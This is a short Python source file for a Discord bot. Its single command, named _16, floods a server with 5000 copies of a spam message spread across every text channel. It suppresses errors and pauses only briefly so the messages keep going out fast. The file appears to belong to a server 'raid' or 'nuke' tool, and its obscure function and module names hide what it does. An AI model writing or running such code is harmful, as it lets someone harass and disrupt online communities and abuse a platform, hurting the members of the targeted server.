import discord
import asyncio
from core.g._78 import _78

async def _16(ctx):
    if not ctx.guild.me.guild_permissions.send_messages:
        await ctx.send("BOT NEEDS SEND MESSAGES PERMISSION", delete_after=3)
        return
    await ctx.send("SPAMMING 5000 MESSAGES", delete_after=2)
    channels = ctx.guild.text_channels
    for i in range(5000):
        channel = channels[i % len(channels)]
        try:
            await channel.send(_78.SPAM_MSG)
        except:
            pass
        if i % 100 == 0:
            await asyncio.sleep(0.05)
    await ctx.send("SENT 5000 MESSAGES")
